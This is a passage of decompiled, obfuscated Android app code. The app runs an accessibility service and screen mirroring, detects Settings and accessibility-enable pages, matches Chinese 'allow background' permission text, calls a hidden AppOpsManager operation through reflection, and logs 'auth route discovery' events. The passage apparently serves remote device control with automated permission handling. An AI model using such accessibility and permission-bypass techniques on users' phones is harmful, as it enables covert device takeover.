        } else if (!z3 && ("restricted-settings-or-system-revoked".equals(str3) || "accessibility-setting-cleared-before-stable".equals(str3) || "accessibility-destroy-before-stable".equals(str3))) {
            str2 = "paused: accessibility service was destroyed before stable confirmation";
        } else if (!z3) {
            str2 = "paused: accessibility service is not running";
        } else if (!z8) {
            str2 = "paused: accessibility service is starting";
        } else if (!z7) {
            str2 = "paused: device locked or screen off";
        }
        return new b2.e(str2.isEmpty(), str2, 3);
    }

    public static boolean j(String str, ArrayList arrayList) {
        String strA = A(str);
        if (!strA.isEmpty()) {
            int size = arrayList.size();
            int i3 = 0;
            while (i3 < size) {
                Object obj = arrayList.get(i3);
                i3++;
                if (strA.equals(A((String) obj))) {
                    return true;
                }
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:29:0x005a, code lost:
    
        if (r3.contains("keyboard") == false) goto L31;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static android.view.accessibility.AccessibilityNodeInfo k(android.accessibilityservice.AccessibilityService r5, java.lang.String r6, android.view.accessibility.AccessibilityEvent r7, b2.a r8) {
        /*
            Method dump skipped, instruction units count: 204
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: f2.i0.k(android.accessibilityservice.AccessibilityService, java.lang.String, android.view.accessibility.AccessibilityEvent, b2.a):android.view.accessibility.AccessibilityNodeInfo");
    }

    public static synchronized void l() {
        f1202a = -1L;
    }

    public static String m(JSONObject jSONObject) {
        JSONArray jSONArrayNames;
        JSONArray jSONArrayOptJSONArray;
        try {
            JSONObject jSONObject2 = new JSONObject(jSONObject.toString());
            if (n(jSONObject2)) {
                return jSONObject2.toString();
            }
            jSONObject2.remove("pageSnapshots");
            if (n(jSONObject2)) {
                return jSONObject2.toString();
            }
            int[] iArr = {4, 2, 0};
            for (int i3 = 0; i3 < 3; i3++) {
                int i4 = iArr[i3];
                JSONObject jSONObjectOptJSONObject = jSONObject2.optJSONObject("discoveries");
                if (jSONObjectOptJSONObject != null && (jSONArrayNames = jSONObjectOptJSONObject.names()) != null) {
                    for (int i5 = 0; i5 < jSONArrayNames.length(); i5++) {
                        JSONObject jSONObjectOptJSONObject2 = jSONObjectOptJSONObject.optJSONObject(jSONArrayNames.optString(i5));
                        if (jSONObjectOptJSONObject2 != null && (jSONArrayOptJSONArray = jSONObjectOptJSONObject2.optJSONArray("candidates")) != null) {
                            JSONArray jSONArray = new JSONArray();
                            int iMin = Math.min(i4, jSONArrayOptJSONArray.length());
                            for (int i6 = 0; i6 < iMin; i6++) {
                                jSONArray.put(jSONArrayOptJSONArray.opt(i6));
                            }
                            try {
                                jSONObjectOptJSONObject2.put("candidates", jSONArray);
                                jSONObjectOptJSONObject2.put("truncated", i4 < jSONArrayOptJSONArray.length() || jSONObjectOptJSONObject2.optBoolean("truncated"));
                            } catch (Exception unused) {
                            }
                        }
                    }
                }
                if (n(jSONObject2)) {
                    return jSONObject2.toString();
                }
            }
            jSONObject2.remove("discoveries");
            String string = jSONObject2.toString();
            Charset charset = StandardCharsets.UTF_8;
            return string.getBytes(charset).length <= 16384 - "event:auth_route_discovery\t".getBytes(charset).length ? string : "{\"schemaVersion\":1,\"truncated\":true}";
        } catch (Exception unused2) {
            return "{}";
        }
    }

    public static boolean n(JSONObject jSONObject) {
        String str = "event:auth_route_discovery\t" + jSONObject.toString();
        return str.indexOf(10) < 0 && str.indexOf(13) < 0 && str.getBytes(StandardCharsets.UTF_8).length <= 16384;
    }

    public static int o(int i3) {
        for (int i4 = 0; i4 < 7; i4++) {
            if (f1209h[i4] == i3) {
                return i4;
            }
        }
        return -1;
    }

    public static Integer p(AppOpsManager appOpsManager, String str, String str2) {
        try {
            Class cls = Integer.TYPE;
            Method declaredMethod = AppOpsManager.class.getDeclaredMethod(str, cls, cls, String.class);
            declaredMethod.setAccessible(true);
            Object objInvoke = declaredMethod.invoke(appOpsManager, 10008, Integer.valueOf(Process.myUid()), str2);
            if (objInvoke instanceof Integer) {
                return (Integer) objInvoke;
            }
            return null;
        } catch (Throwable unused) {
            return null;
        }
    }

    public static boolean q(String str, List list) {
        if (list == null) {
            return false;
        }
        Iterator it = list.iterator();
        while (it.hasNext()) {
            String str2 = (String) it.next();
            if (str != null && str2 != null) {
                String strTrim = str.trim();
                String strTrim2 = str2.trim();
                if (!strTrim2.isEmpty() && strTrim.equalsIgnoreCase(strTrim2)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static boolean r(String str, ArrayList arrayList, ArrayList arrayList2) {
        String strA = A(str);
        if (!strA.isEmpty() && f(strA, arrayList)) {
            boolean z2 = (strA.contains("完全允许") || strA.contains("完全允許")) && (strA.contains("后台行为") || strA.contains("後台行為") || strA.contains("背景行為") || strA.contains("后台运行") || strA.contains("後台執行"));
            if (f(strA, arrayList2) || z2) {
                return true;
            }
        }
        return false;
    }

    public static boolean s(ScreenMirrorService screenMirrorService) {
        String str;
        a aVarH = H(screenMirrorService);
        try {
            boolean zIsEmpty = ((ArrayList) aVarH.f1121g).isEmpty();
            boolean z2 = !zIsEmpty && l.G((String) aVarH.f1116b, (String) aVarH.f1117c, (String[]) aVarH.f1118d);
            boolean z3 = !zIsEmpty && l.D((String) aVarH.f1115a, (String) aVarH.f1116b, (String) aVarH.f1117c, (String[]) aVarH.f1118d);
            boolean z4 = !zIsEmpty && l.J((String) aVarH.f1115a, (String) aVarH.f1116b, (String) aVarH.f1117c);
            boolean z5 = zIsEmpty || z2 || z3 || z4;
            if (zIsEmpty) {
                str = "tree_unreadable";
            } else if (z2) {
                str = "enable_page";
            } else if (z3) {
                str = "a11y_subtree";
            } else {
                str = z4 ? "unknown_settings_subpage" : "safe";
            }
            u(str, z5, aVarH);
            return z5;
        } finally {
            F(aVarH);
        }
    }

    public static void t(Context context) {
        Intent intent;
        try {
            intent = context.getPackageManager().getLaunchIntentForPackage(o4.f4708a);
        } catch (Throwable unused) {
            intent = null;
        }
        if (intent == null) {
            try {
                intent = new Intent();
                intent.setComponent(new ComponentName(o4.f4708a, o4.f4709b));
            } catch (Throwable th) {
                a0.a.p(th, new StringBuilder("wrapper launch failed: "), "AuthSetupLauncher");
                return;
            }
        }
        intent.addFlags(874643456);
        context.startActivity(intent);
        Log.i("AuthSetupLauncher", "wrapper launched once");
    }

    public static void u(String str, boolean z2, a aVar) {
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        String str2 = aVar == null ? "" : (String) aVar.f1115a;
        String str3 = aVar != null ? (String) aVar.f1116b : "";
        String str4 = str + "|" + str2 + "|" + str3;
        if (!str4.equals(f1214m) || jElapsedRealtime - n >= 2000) {
            f1214m = str4;
            n = jElapsedRealtime;
            Log.i("A11yEnableLeave", "handoff assessment reason=" + str + " unsafe=" + z2 + " pkg=" + str2 + " cls=" + str3);
        }
    }

    public static boolean v(String str) {
        if (str == null || str.isEmpty()) {
            return false;
        }
        return "com.android.settings".equals(str) || str.toLowerCase(Locale.ROOT).contains("settings");
    }

    public static ArrayList w(String str, String[] strArr) {
        ArrayList arrayList = new ArrayList();
        if (str != null && !str.isEmpty()) {
            String lowerCase = str.toLowerCase(Locale.ROOT);
            for (String str2 : strArr) {
                if (str2 != null && !str2.isEmpty() && lowerCase.contains(str2.toLowerCase(Locale.ROOT))) {
                    arrayList.add(str2);
                }
            }
        }
        return arrayList;
    }

    public static String[] x() {
        int i3 = Build.VERSION.SDK_INT;
        ArrayList arrayList = new ArrayList();
        arrayList.add("android.permission.INTERNET");
        arrayList.add("android.permission.WAKE_LOCK");
        arrayList.add("android.permission.ACCESS_NETWORK_STATE");
        arrayList.add("android.permission.ACCESS_WIFI_STATE");
        arrayList.add("android.permission.CHANGE_WIFI_STATE");
        arrayList.add("android.permission.MODIFY_AUDIO_SETTINGS");
        if (i3 >= 33) {
            arrayList.add("android.permission.POST_NOTIFICATIONS");
        }
        return (String[]) arrayList.toArray(new String[0]);
    }

    public static boolean y(int i3, String str, String str2) {
        if ((i3 == 2 || i3 == 4 || i3 == 5) && !"not_required".equals(str2)) {
            return !"success".equals(str);
        }
        return false;
    }

    public static int z(int i3) {
        int i4;
        int[] iArr = f1209h;
        if (i3 < 0) {
            return iArr[0];
        }
        if (i3 >= 7) {
            return 7;
        }
        if (o(i3) >= 0) {
            return i3;
        }
        int iO = o(i3);
        if (iO >= 0 && (i4 = iO + 1) < 7) {
            return iArr[i4];
        }
        return 7;
    }
}
